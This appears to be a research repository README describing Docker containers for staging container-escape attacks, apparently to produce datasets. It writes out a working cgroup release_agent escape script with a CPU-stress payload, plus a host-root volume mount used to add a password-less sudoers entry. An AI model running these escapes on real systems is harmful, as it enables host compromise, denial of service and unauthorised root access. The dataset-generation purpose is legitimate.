# Escape Containers

The directory has the containers that are used to launch a container escape and associated attack.  It also has other background containers.  The container escapes were derived from the following.

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/


## Denial of Service Container

Get the latest ubuntu image

```bash
docker pull ubuntu
```

Using original ubuntu, install nano, add escape.sh, then commit

```bash
docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

From within container

```bash
apt-get update
apt-get install nano
nano escape.sh
#!/usr/bin/bash
...
(save)
chmod +x escape.sh
```

In another host terminal, saved current ubuntu to ubuntu_escape image.  The ubuntu_escape will have the escape.sh

```bash
docker commit ESCAPE_A ubuntu_escape
```

You can now exit the ubuntu container.

From a host terminal, start the ubuntu_escape container with reduced security.

```bash
docker run --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash
```

Finally, from other host terminal, execute escape.sh in ubuntu_escape.  This launches the attack (you can use top to see the increased CPU usage).  Note that [scenarioDos.py](./src/scenarioDos.py) uses this to launch the attack.
```bash
docker exec -it ESCAPE_A /escape.sh
```

### Escape

In the container, create escape.sh file with following

```bash
#!/bin/sh
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup_memory /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat stress.txt > /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Attack

In the container, create stress.txt file with following

```bash
#!/bin/bash
stress() {
  (
    pids=""
    cpus=${1:-1}
    seconds=${2:-60}
    echo loading $cpus CPUs for $seconds seconds
    trap 'for p in $pids; do kill $p; done' 0
    for ((i=0;i<cpus;i++)); do while : ; do : ; done & pids="$pids $!"; done
    sleep $seconds
  )
}
stress 2 20
```

## Privilege Escalation Container

Create container from alpine image.

### Escape

The privilege escape is really accomplished by the mounting of a volume during container building.

```
FROM alpine
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR
```

Execute the following command to build container.

```bash
docker build -t priv-container .
```

You can execute the following command to run the container.  Note that this is done in the [scenarioPrivesc.py](../src/scenarioPrivesc.py).

```bash
docker run --name ESCAPE_B -v /:/privesc -it priv-container /bin/sh
```

### Attack

The attack assumes a user testuer aleady exists that has password requires sudo privilege (the attack changes this to password-less).  From within the container, the following is executed.

```bash
echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd
```


## Prometheus-Grafana Container

The prometheus-grafana container is take from awesome-compose and can be started and stopped with the following.  Note that this is done in the [scenarioGrafana.py](../src/scenarioGrafana.py).

```bash
sudo docker-compose -f prometheus-grafana/docker-compose.yml up --no-start
sudo docker-compose -f prometheus-grafana/docker-compose.yml start
```

```bash
sudo docker-compose -f prometheus-grafana/docker-compose.yml stop
sudo docker-compose -f prometheus-grafana/docker-compose.yml rm -f
```

## Internet of Things Container

The IoT container used for the datasets is described here.  We do not provide the container because it exceeded github's maximum file size.

The IoT container is based on the ubuntu image.  It was then configured to setup the tunslip interface to communicate with an IEEE 802.15.4 wireless dongle over /tty/ACM0.  The dongle is programmed with the contiki-ng rpl-border-router example using TSCH.

The remote endpoints are nRF52480 boards programmed with the contiki-ng rpl-udp example using TSCH.  The endpoints take a temperature sensor reading every five seconds and send to the UDP server running in the Docker IoT container.

This container setup works for both the Umbrella edge device (built-in dongle) and the Linux Raspian VM (USB attached dongle).
